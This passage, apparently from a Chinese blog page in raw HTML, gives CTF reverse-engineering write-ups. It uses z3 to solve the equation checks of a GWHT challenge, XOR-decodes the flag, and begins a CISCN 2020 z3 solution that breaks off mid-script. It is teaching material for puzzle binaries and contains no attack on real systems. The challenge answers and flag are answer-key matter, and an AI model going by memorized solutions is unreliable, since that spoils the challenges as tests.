class="number">64</span>) + a14 * <span class="number">27</span> == <span class="number">9710</span>) &amp; (((((a1 * <span class="number">67</span> - a2 * <span class="number">68</span>) + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span>) + a14 * <span class="number">31</span> == <span class="number">13376</span>) &amp; ((((a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span>) + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span>) + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span>) + a14 * <span class="number">78</span> == <span class="number">24065</span>) &amp; ((((a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span>) + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">20</span> == <span class="number">27687</span>) &amp; (((a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span>) + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) &amp; (((a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>):</span><br><span class="line">    print(<span class="string">&#x27;flag is GWHT&#123;md5(your_input)&#125;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Congratulations and have fun!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Sorry,plz try again...&#x27;</span>)</span><br></pre></td></tr></table></figure><p>分析之后确定需要先求解出 a1~a14 的值，然后再经过一次异或获得 flag 。</p><p>这里我们手动添加多个变量，因为源码中的方式形式为 ax 。如果我们用列表管理变量，方程需要手动修改，消耗更多时间得不偿失。z3 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">a1 = Int(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">a2 = Int(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">a3 = Int(<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">a4 = Int(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">a5 = Int(<span class="string">&#x27;a5&#x27;</span>)</span><br><span class="line">a6 = Int(<span class="string">&#x27;a6&#x27;</span>)</span><br><span class="line">a7 = Int(<span class="string">&#x27;a7&#x27;</span>)</span><br><span class="line">a8 = Int(<span class="string">&#x27;a8&#x27;</span>)</span><br><span class="line">a9 = Int(<span class="string">&#x27;a9&#x27;</span>)</span><br><span class="line">a10 = Int(<span class="string">&#x27;a10&#x27;</span>)</span><br><span class="line">a11 = Int(<span class="string">&#x27;a11&#x27;</span>)</span><br><span class="line">a12 = Int(<span class="string">&#x27;a12&#x27;</span>)</span><br><span class="line">a13 = Int(<span class="string">&#x27;a13&#x27;</span>)</span><br><span class="line">a14 = Int(<span class="string">&#x27;a14&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">solver.add((((a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">solver.add((((a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span>) + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span>) + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">solver.add((((a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span>) + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span>) + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span>) + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line"><span class="comment"># solver.add((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 == 37136) </span></span><br><span class="line">solver.add(((a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span>) + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) </span><br><span class="line">solver.add((((a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span>) + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span>) + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">28</span> == <span class="number">17298</span>) </span><br><span class="line">solver.add((((a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span>) + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span>) + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span>) + a14 * <span class="number">65</span> == <span class="number">19875</span>) </span><br><span class="line">solver.add(((a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span>) + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) </span><br><span class="line">solver.add((((a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span>) + a14 * <span class="number">27</span> == <span class="number">9710</span>) </span><br><span class="line">solver.add(((((a1 * <span class="number">67</span> - a2 * <span class="number">68</span>) + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span>) + a14 * <span class="number">31</span> == <span class="number">13376</span>) </span><br><span class="line">solver.add((((a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span>) + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span>) + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span>) + a14 * <span class="number">78</span> == <span class="number">24065</span>) </span><br><span class="line">solver.add((((a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span>) + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">20</span> == <span class="number">27687</span>) </span><br><span class="line">solver.add(((a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span>) + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) </span><br><span class="line">solver.add(((a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line">solver.add(a1 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a2 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a3 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a4 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a5 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a6 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a7 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a8 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a9 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a10 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a11 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a12 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a13 &gt;= <span class="number">0</span>)</span><br><span class="line">solver.add(a14 &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    print(<span class="string">&quot;solver&quot;</span>)</span><br><span class="line">    ans = solver.model()</span><br><span class="line">    print(ans)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里我们需要将有移位运算的那一条方程注释掉，因为 Int 没有这种运算方法。然后我们知道 a1~a14 是两两整数异或而来，所以加上约束大于等于 0 ，否则由于缺少一条方程解出来的值含有负数。</p><p><strong>如果不想注释那条方程，完全使用全部方程，那么就将变量定义为：<code>BitVec(&#39;an&#39;, 16)</code> ，那么就能够使用移位运算。</strong></p><p>然后就是还原异或加密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a13 = <span class="number">88</span><span class="comment">#121</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">code[<span class="number">0</span>] = a3</span><br><span class="line">code[<span class="number">1</span>] = a2</span><br><span class="line">code[<span class="number">2</span>] = a1</span><br><span class="line">code[<span class="number">3</span>] = a4</span><br><span class="line">code[<span class="number">4</span>] = a5</span><br><span class="line">code[<span class="number">5</span>] = a6</span><br><span class="line">code[<span class="number">6</span>] = a7</span><br><span class="line">code[<span class="number">7</span>] = a8</span><br><span class="line">code[<span class="number">9</span>] = a9</span><br><span class="line">code[<span class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line">flag.append(<span class="built_in">chr</span>(code[<span class="number">13</span>]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">13</span>))[::-<span class="number">1</span>]:</span><br><span class="line">    code[i] = (code[i] ^ code[i + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">        print(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#flag:U_G07_th3_k3y!</span></span><br></pre></td></tr></table></figure><h3 id="2020-CISCN-z3"><a href="#2020-CISCN-z3" class="headerlink" title="2020 CISCN z3"></a>2020 CISCN z3</h3><p>用 IDA 分析题目得知，程序将输入值经过运算后与 Dst 的密文对比，也就是知道解，求出未知数。</p><p>Dst 定义是 int 型（8 字节），将密文提取出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de = [<span class="number">0x4F17</span>,<span class="number">0x9CF6</span>,<span class="number">0x8DDB</span>,<span class="number">0x8EA6</span>,<span class="number">0x6929</span>,<span class="number">0x9911</span>,<span class="number">0x40A2</span>,<span class="number">0x2F3E</span>,<span class="number">0x62B6</span>,<span class="number">0x4B82</span>,<span class="number">0x486C</span>,<span class="number">0x4002</span>,<span class="number">0x52D7</span>,<span class="number">0x2DEF</span>,<span class="number">0x28DC</span>,<span class="number">0x640D</span>,<span class="number">0x528F</span>,<span class="number">0x613B</span>,<span class="number">0x4781</span>,<span class="number">0x6B17</span>,<span class="number">0x3237</span>,<span class="number">0x2A93</span>,<span class="number">0x615F</span>,<span class="number">0x50BE</span>,<span class="number">0x598E</span>,<span class="number">0x4656</span>,<span class="number">0x5B31</span>,<span class="number">0x313A</span>,<span class="number">0x3010</span>,<span class="number">0x67FE</span>,<span class="number">0x4D5F</span>,<span class="number">0x58DB</span>,<span class="number">0x3799</span>,<span class="number">0x60A0</span>,<span class="number">0x2750</span>,<span class="number">0x3759</span>,<span class="number">0x8953</span>,<span class="number">0x7122</span>,<span class="number">0x81F9</span>,<span class="number">0x5524</span>,<span class="number">0x8971</span>,<span class="number">0x3A1D</span>]</span><br></pre></td></tr></table></figure><p>这里还是用手动申请变量，因为避免修改方程表达式。这道例题可以用 Int 也可以用 BitVec ，这里就用 BitVec</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">de = [<span class="number">0x4F17</span>,<span class="number">0x9CF6</span>,<span class="number">0x8DDB</span>,<span class="number">0x8EA6</span>,<span class="number">0x6929</span>,<span class="number">0x9911</span>,<span class="number">0x40A2</span>,<span class="number">0x2F3E</span>,<span class="number">0x62B6</span>,<span class="number">0x4B82</span>,<span class="number">0x486C</span>,<span class="number">0x4002</span>,<span class="number">0x52D7</span>,<span class="number">0x2DEF</span>,<span class="number">0x28DC</span>,<span class="number">0x640D</span>,<span class="number">0x528F</span>,<span class="number">0x613B</span>,<span class="number">0x4781</span>,<span class="number">0x6B17</span>,<span class="number">0x3237</span>,<span class="number">0x2A93</span>,<span class="number">0x615F</span>,<span class="number">0x50BE</span>,<span class="number">0x598E</span>,<span class="number">0x4656</span>,<span class="number">0x5B31</span>,<span class="number">0x313A</span>,<span class="number">0x3010</span>,<span class="number">0x67FE</span>,<span class="number">0x4D5F</span>,<span class="number">0x58DB</span>,<span class="number">0x3799</span>,<span class="number">0x60A0</span>,<span class="number">0x2750</span>,<span class="number">0x3759</span>,<span class="number">0x8953</span>,<span class="number">0x7122</span>,<span class="number">0x81F9</span>,<span class="number">0x5524</span>,<span class="number">0x8971</span>,<span class="number">0x3A1D</span>]</span><br><span class="line">v46=BitVec(<span class="string">&#x27;v46&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v47=BitVec(<span class="string">&#x27;v47&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v48=BitVec(<span class="string">&#x27;v48&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v49=BitVec(<span class="string">&#x27;v49&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v50=BitVec(<span class="string">&#x27;v50&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v51=BitVec(<span class="string">&#x27;v51&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v52=BitVec(<span class="string">&#x27;v52&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v53=BitVec(<span class="string">&#x27;v53&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v54=BitVec(<span class="string">&#x27;v54&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v55=BitVec(<span class="string">&#x27;v55&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v56=BitVec(<span class="string">&#x27;v56&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v57=BitVec(<span class="string">&#x27;v57&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v58=BitVec(<span class="string">&#x27;v58&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v59=BitVec(<span class="string">&#x27;v59&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v60=BitVec(<span class="string">&#x27;v60&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v61=BitVec(<span class="string">&#x27;v61&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v62=BitVec(<span class="string">&#x27;v62&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v63=BitVec(<span class="string">&#x27;v63&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v64=BitVec(<span class="string">&#x27;v64&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v65=BitVec(<span class="string">&#x27;v65&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v66=BitVec(<span class="string">&#x27;v66&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v67=BitVec(<span class="string">&#x27;v67&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v68=BitVec(<span class="string">&#x27;v68&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v69=BitVec(<span class="string">&#x27;v69&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v70=BitVec(<span class="string">&#x27;v70&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v71=BitVec(<span class="string">&#x27;v71&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v72=BitVec(<span class="string">&#x27;v72&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v73=BitVec(<span class="string">&#x27;v73&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v74=BitVec(<span class="string">&#x27;v74&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v75=BitVec(<span class="string">&#x27;v75&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v76=BitVec(<span class="string">&#x27;v76&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v77=BitVec(<span class="string">&#x27;v77&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v78=BitVec(<span class="string">&#x27;v78&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v79=BitVec(<span class="string">&#x27;v79&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v80=BitVec(<span class="string">&#x27;v80&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v81=BitVec(<span class="string">&#x27;v81&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v82=BitVec(<span class="string">&#x27;v82&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v83=BitVec(<span class="string">&#x27;v83&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v84=BitVec(<span class="string">&#x27;v84&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v85=BitVec(<span class="string">&#x27;v85&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v86=BitVec(<span class="string">&#x27;v86&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v87=BitVec(<span class="string">&#x27;v87&#x27;</span>,<span class="number">8</span>)</span><br><span class="line">v4=de[<span class="number">0</span>]</span><br><span class="line">v5=de[<span class="number">1</span>]</span><br><span class="line">v6=de[<span class="number">2</span>]</span><br><span class="line">v7=de[<span class="number">3</span>]</span><br><span class="line">v8=de[<span class="number">4</span>]</span><br><span class="line">v9=de[<span class="number">5</span>]</span><br><span class="line">v10=de[<span class="number">6</span>]</span><br><span class="line">v11=de[<span class="number">7</span>]</span><br><span class="line">v12=de[<span class="number">8</span>]</span><br><span class="line">v13=de[<span class="number">9</span>]</span><br><span class="line">v14=de[<span class="number">10</span>]</span><br><span class="line">v15=de[<span class="number">11</span>]</span><br><span class="line">v16=de[<span class="number">12</span>]</span><br><span class="line">v17=de[<span class="number">13</span>]</span><br><span class="line">v18=de[<span class="number">14</span>]</span><br><span class="line">v19=de[<span class="number">15</span>]</span><br><span class="line">v20=de[<span class="number">16</span>]</span><br><span class="line">v21=de[<span class="number">17</span>]</span><br><span class="line">v22=de[<span class="number">18</span>]</span><br><span class="line">v23=de[<span class="number">19</span>]</span><br><span class="line">v24=de[<span class="number">20</span>]</span><br><span class="line">v25=de[<span class="number">21</span>]</span><br><span class="line">v26=de[<span class="number">22</span>]</span><br><span class="line">v27=de[<span class="number">23</span>]</span><br><span class="line">v28=de[<span class="number">24</span>]</span><br><span class="line">v29=de[<span class="number">25</span>]</span><br><span class="line">v30=de[<span class="number">26</span>]</span><br><span class="line">v31=de[<span class="number">27</span>]</span><br><span class="line">v32=de[<span class="number">28</span>]</span><br><span class="line">v33=de[<span class="number">29</span>]</span><br><span class="line">v34=de[<span class="number">30</span>]</span><br><span class="line">v35=de[<span class="number">31</span>]</span><br><span class="line">v36=de[<span class="number">32</span>]</span><br><span class="line">v37=de[<span class="number">33</span>]</span><br><span class="line">v38=de[<span class="number">34</span>]</span><br><span class="line">v39=de[<span class="number">35</span>]</span><br><span class="line">v40=de[<span class="number">36</span>]</span><br><span class="line">v41=de[<span class="number">37</span>]</span><br><span class="line">v42=de[<span class="number">38</span>]</span><br><span class="line">v43=de[<span class="number">39</span>]</span><br><span class="line">v44=de[<span class="number">40</span>]</span><br><span class="line">v45=de[<span class="number">41</span>]</span><br><span class="line">s=Solver()</span><br><span class="line">s.add(v4 == <span 